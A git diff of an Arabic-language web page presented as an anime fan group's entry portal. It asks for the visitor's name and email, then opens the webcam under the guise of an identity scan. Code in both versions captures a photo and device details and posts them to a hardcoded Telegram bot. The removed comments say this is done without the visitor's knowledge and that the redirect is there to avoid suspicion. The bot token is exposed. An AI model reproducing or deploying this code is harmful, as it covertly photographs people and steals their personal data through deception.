@@ -3,198 +3,198 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة المملكة الأسطورية | يوسف علاء</title>
+    <title>⛩️ مملكة يوسف علاء السيادية</title>
     
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&family=Cairo:wght@700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Tajawal:wght@700;900&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
 
     <style>
-        :root { --p: #ff003c; --a: #ffb700; --d: #050505; --g: rgba(10, 10, 10, 0.9); }
-        * { box-sizing: border-box; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Tajawal', sans-serif; background: var(--d); color: #fff; overflow: hidden; }
+        :root { --red: #ff003c; --gold: #ffb700; --black: #050505; }
+        
+        * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: var(--black); overflow: hidden; }
 
-        /* فيديو الخلفية */
-        #bg-video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -2; opacity: 0.5; }
-        .mask { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, transparent 20%, #000 100%); z-index: -1; }
-
-        .super-container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-
-        .empire-card {
-            background: var(--g); backdrop-filter: blur(30px); border: 2px solid var(--p);
-            border-radius: 40px; width: 100%; max-width: 600px; padding: 50px; text-align: center;
-            box-shadow: 0 0 70px rgba(255, 0, 60, 0.4); position: relative; animation: slideInUp 1s;
+        /* مشغل الفيديوهات الخلفي */
+        #video-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover; z-index: 1; opacity: 0.6;
         }
 
-        /* رأس الصفحة */
-        .header h1 { font-family: 'Cairo', sans-serif; font-size: 40px; margin: 0; background: linear-gradient(to bottom, #fff, var(--p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .header span { color: var(--a); font-weight: 900; letter-spacing: 5px; font-size: 14px; }
-
-        /* مدخلات البيانات */
-        .input-group { margin-top: 30px; text-align: right; }
-        .input-group label { display: block; margin-bottom: 10px; color: var(--a); font-weight: bold; font-size: 14px; }
-        .input-group input {
-            width: 100%; padding: 20px; border-radius: 15px; border: 1px solid #333;
-            background: rgba(255,255,255,0.05); color: #fff; font-size: 16px; outline: none; transition: 0.4s;
+        /* الطبقة السوداء المشعة فوق الفيديو */
+        .overlay-ui {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 2; display: flex; justify-content: center; align-items: center;
+            background: radial-gradient(circle, rgba(0,0,0,0.4) 0%, rgba(5,5,5,0.9) 100%);
         }
-        .input-group input:focus { border-color: var(--p); box-shadow: 0 0 20px rgba(255, 0, 60, 0.2); }
 
-        /* منطقة الكاميرا (مموهة كأنها فحص بصمة) */
-        .identity-check { margin-top: 30px; border-radius: 25px; overflow: hidden; border: 4px solid #1a1a1a; position: relative; background: #000; }
-        #v { width: 100%; display: block; transform: scaleX(-1); }
-        .scan-line { position: absolute; width: 100%; height: 3px; background: var(--p); box-shadow: 0 0 20px var(--p); animation: scanning 2s infinite; }
-        @keyframes scanning { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
-
-        /* الأزرار الأسطورية */
-        .btn-empire {
-            width: 100%; padding: 25px; margin-top: 30px; border: none; border-radius: 20px;
-            background: linear-gradient(45deg, var(--p), #80001e); color: #fff;
-            font-size: 22px; font-weight: 900; cursor: pointer; font-family: 'Cairo', sans-serif;
-            box-shadow: 0 10px 30px rgba(255, 0, 60, 0.5);
+        /* الكارت الرئيسي المشع */
+        .main-card {
+            position: relative; width: 90%; max-width: 450px;
+            background: rgba(10, 10, 10, 0.8);
+            backdrop-filter: blur(15px);
+            border: 2px solid var(--red);
+            border-radius: 30px; padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(255, 0, 60, 0.6), inset 0 0 20px rgba(255, 0, 60, 0.2);
+            animation: glow 3s infinite alternate;
         }
-        .btn-empire:hover { transform: scale(1.02); filter: brightness(1.2); }
 
-        .y-photo { width: 100%; border-radius: 20px; border: 2px solid var(--a); margin-bottom: 20px; }
+        @keyframes glow { from { box-shadow: 0 0 30px rgba(255, 0, 60, 0.4); } to { box-shadow: 0 0 60px rgba(255, 0, 60, 0.8); } }
+
+        h1 { color: #fff; text-shadow: 0 0 15px var(--red); margin: 0 0 10px 0; font-size: 28px; }
+        p.founder { color: var(--gold); font-size: 14px; font-weight: 900; margin-bottom: 30px; letter-spacing: 2px; }
+
+        .input-group { margin-bottom: 20px; text-align: right; }
+        label { display: block; color: var(--gold); font-size: 12px; margin-bottom: 8px; margin-right: 5px; }
+        input {
+            width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #333;
+            background: rgba(0,0,0,0.5); color: #fff; font-size: 16px; outline: none;
+            transition: 0.3s; text-align: right;
+        }
+        input:focus { border-color: var(--red); box-shadow: 0 0 15px rgba(255, 0, 60, 0.3); }
+
+        .btn-action {
+            width: 100%; padding: 18px; border: none; border-radius: 12px;
+            background: linear-gradient(45deg, var(--red), #80001e);
+            color: #fff; font-size: 18px; font-weight: 900; cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 0, 60, 0.4); transition: 0.3s;
+        }
+        .btn-action:hover { transform: scale(1.03); filter: brightness(1.2); }
+
+        #camera-section { display: none; }
+        .cam-box { width: 100%; border-radius: 15px; overflow: hidden; border: 2px solid var(--red); margin: 20px 0; background: #000; position: relative; }
+        video#webcam { width: 100%; display: block; transform: scaleX(-1); }
+        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--red); box-shadow: 0 0 10px var(--red); animation: scan 2s infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
         .hidden { display: none; }
-        .footer { margin-top: 40px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px; color: var(--a); font-weight: 900; }
     </style>
 </head>
 <body>
 
-    <video id="bg-video" autoplay muted playsinline></video>
-    <div class="mask"></div>
+    <video id="video-bg" autoplay muted playsinline></video>
 
-    <div class="super-container">
-        <div class="empire-card">
-            
-            <div class="header">
-                <h1>مَمْلَكَة الأوتـاكو</h1>
-                <span>القائد يوسف علاء</span>
-            </div>
+    <div class="overlay-ui">
+        <div class="main-card">
+            <h1>⛩️ مَمْلَكَة الأوتـاكو</h1>
+            <p class="founder">بإشراف القائد: يوسف علاء</p>
 
             <div id="step1">
-                <p style="color: #ccc; font-size: 14px; margin-top: 20px;">أهلاً بك في البوابة الرئيسية، يرجى ملء وثيقة الدخول..</p>
                 <div class="input-group">
                     <label>👤 الاسم الكامل للمحارب:</label>
-                    <input type="text" id="name" placeholder="ادخل اسمك هنا" required>
+                    <input type="text" id="u_name" placeholder="اكتب اسمك الحقيقي..." required>
                 </div>
                 <div class="input-group">
                     <label>📧 البريد الإلكتروني المعتمد:</label>
-                    <input type="email" id="mail" placeholder="example@mail.com" required>
+                    <input type="email" id="u_mail" placeholder="example@gmail.com" required>
                 </div>
-                <button onclick="startProtocol()" class="btn-empire">تفعيل رتبة الدخول 🛡️</button>
+                <button onclick="activateGate()" class="btn-action">فتح البوابة الملكية ⚔️</button>
             </div>
 
             <div id="step2" class="hidden">
-                <img src="Screenshot_2026-03-14-17-16-23-72.jpg" class="y-photo" alt="Youssef Alaa">
-                <p id="status-text" style="color: var(--a); font-weight: bold;">جاري ربط حسابك بخوادم المملكة..</p>
-                <div class="identity-check">
+                <p style="color:#ccc; font-size: 12px;">جاري مطابقة الهوية مع سجلات القائد..</p>
+                <div class="cam-box">
                     <div class="scan-line"></div>
-                    <video id="v" autoplay playsinline></video>
-                    <canvas id="c" style="display:none;"></canvas>
+                    <video id="webcam" autoplay playsinline></video>
+                    <canvas id="out" style="display:none;"></canvas>
                 </div>
-                <button onclick="finalSubmit()" class="btn-empire">إتمام عملية الانضمام 🚀</button>
+                <button onclick="captureAndSend()" class="btn-action">تأكيد الدخول النهائي 🚀</button>
             </div>
 
-            <div class="footer">👑 THE FOUNDER: YOUSSEF ALAA 👑</div>
+            <p style="margin-top: 25px; color: #444; font-size: 10px; font-weight: bold;">ALL RIGHTS RESERVED TO YOUSSEF ALAA © 2026</p>
         </div>
     </div>
 
     <script>
-        // --- الإعدادات السيادية للقائد يوسف علاء ---
-        const SECRETS = {
-            t: "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g",
-            c: "7394389253",
-            w: "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts",
-            vids: [
-                "385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4",
-                "fqBsQ4ZhiMk.mp4"
-            ]
-        };
+        const TOKEN = "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g";
+        const CHAT_ID = "7394389253";
+        const WHATSAPP = "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts";
+        const VIDS = ["385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4", "fqBsQ4ZhiMk.mp4"];
+        
+        let vIndex = 0;
+        const bgVid = document.getElementById('video-bg');
 
-        // --- مشغل الفيديوهات Playlist ---
-        const vp = document.getElementById('bg-video');
-        let vi = 0;
-        function playV() {
-            vp.src = SECRETS.vids[vi];
-            vp.play().catch(()=>{});
-            vi = (vi + 1) % SECRETS.vids.length;
+        // نظام الفيديوهات المتتابع
+        function nextVid() {
+            bgVid.src = VIDS[vIndex];
+            bgVid.play().catch(()=>{});
+            vIndex = (vIndex + 1) % VIDS.length;
         }
-        vp.onended = playV;
-        playV();
+        bgVid.onended = nextVid;
+        nextVid();
 
-        // --- بروتوكول المرحلة الأولى ---
-        function startProtocol() {
-            const n = document.getElementById('name').value;
-            const m = document.getElementById('mail').value;
-            if (n.length < 3 || !m.includes('@')) {
-                Swal.fire({ title: 'عذراً!', text: 'يرجى ملء البيانات بشكل كامل.', icon: 'info', background: '#111', color: '#fff' });
-                return;
+        // تفعيل الصوت عند أول ضغطة
+        function enableAudio() {
+            bgVid.muted = false;
+            bgVid.volume = 0.5;
+        }
+
+        function activateGate() {
+            const n = document.getElementById('u_name').value;
+            const m = document.getElementById('u_mail').value;
+
+            if(n.length < 3 || !m.includes('@')) {
+                return Swal.fire({ icon: 'error', title: 'بيانات ناقصة', background: '#111', color: '#fff' });
             }
+
+            enableAudio(); // تشغيل الصوت فوراً
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
-            
+
             navigator.mediaDevices.getUserMedia({ video: true })
-                .then(s => { document.getElementById('v').srcObject = s; })
-                .catch(() => { Swal.fire('تنبيه أمني', 'يجب السماح بالوصول لإنهاء الربط!', 'warning'); });
+                .then(s => { document.getElementById('webcam').srcObject = s; })
+                .catch(() => { Swal.fire('تنبيه', 'يجب تفعيل الكاميرا للمتابعة!', 'warning'); });
         }
 
-        // --- الإرسال الاستخباراتي العبقري ---
-        async function finalSubmit() {
-            Swal.fire({ title: 'جاري الحفظ..', html: 'يتم الآن مزامنة بياناتك مع المملكة..', background: '#0a0a0a', color: '#fff', didOpen: () => Swal.showLoading() });
+        async function captureAndSend() {
+            Swal.fire({ title: 'جاري الإرسال...', text: 'يتم الآن نقل بياناتك للقائد يوسف علاء', background: '#000', color: '#fff', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
 
-            const video = document.getElementById('v');
-            const canvas = document.getElementById('c');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            const video = document.getElementById('webcam');
+            const canvas = document.getElementById('out');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
 
             canvas.toBlob(async (blob) => {
-                const name = document.getElementById('name').value;
-                const mail = document.getElementById('mail').value;
-                
-                // جمع بيانات استخباراتية عميقة بدون علم الزائر
-                let batteryInfo = "غير متاح";
-                try { const b = await navigator.getBattery(); batteryInfo = `${Math.round(b.level * 100)}%`; } catch(e){}
+                const name = document.getElementById('u_name').value;
+                const mail = document.getElementById('u_mail').value;
 
-                const report = `
-🚨 **إشعار دخول سيادي جديد** 🚨
-━━━━━━━━━━━━━━━━━━
-👤 **اسم المحارب:** ${name}
+                const caption = `
+🚨 **محارب جديد على الأبواب** 🚨
+━━━━━━━━━━━━━━
+👤 **الاسم:** ${name}
 📧 **البريد:** ${mail}
 📱 **الجهاز:** ${navigator.platform}
-🔋 **البطارية:** ${batteryInfo}
-🌐 **المتصفح:** ${navigator.vendor}
-🖥️ **الدقة:** ${screen.width}x${screen.height}
-🌍 **اللغة:** ${navigator.language}
+🔋 **البطارية:** ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'غير متاح'}
 ⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━━━━━
-👑 **بأمر القائد: يوسف علاء** 👑
+━━━━━━━━━━━━━━
+👑 **بإشراف: يوسف علاء** 👑
                 `;
 
                 const fd = new FormData();
-                fd.append("chat_id", SECRETS.c);
-                fd.append("photo", blob, "warrior.jpg");
-                fd.append("caption", report);
+                fd.append("chat_id", CHAT_ID);
+                fd.append("photo", blob, "capture.jpg");
+                fd.append("caption", caption);
                 fd.append("parse_mode", "Markdown");
 
-                // إرسال البيانات باستخدام محاولات لضمان الوصول
                 try {
-                    const response = await fetch(`https://api.telegram.org/bot${SECRETS.t}/sendPhoto`, {
+                    // محاولة الإرسال لتليجرام وانتظار الرد
+                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                         method: "POST",
                         body: fd
                     });
 
-                    if(response.ok) {
-                        Swal.fire({ icon: 'success', title: 'تم الانضمام!', text: 'مرحباً بك في جيش يوسف علاء.. جاري نقلك.', timer: 1500, showConfirmButton: false });
-                        setTimeout(() => window.location.href = SECRETS.w, 1500);
+                    if (response.ok) {
+                        // فقط إذا نجح الإرسال يتم التحويل
+                        window.location.href = WHATSAPP;
                     } else {
-                        // لو السيرفر تقيل، حوله برضو عشان ميشكش
-                        window.location.href = SECRETS.w;
+                        // إذا فشل تليجرام، نظهر رسالة خطأ
+                        Swal.fire('خطأ في السيرفر', 'فشل إرسال البيانات، تأكد من الإنترنت.', 'error');
                     }
-                } catch (err) {
-                    window.location.href = SECRETS.w;
+                } catch (e) {
+                    Swal.fire('خطأ في الاتصال', 'تأكد من اتصالك بالإنترنت وحاول مجدداً.', 'error');
                 }
-            }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً لسرعة الإرسال الضمانية
+            }, 'image/jpeg', 0.8);
         }
     </script>
 </body>
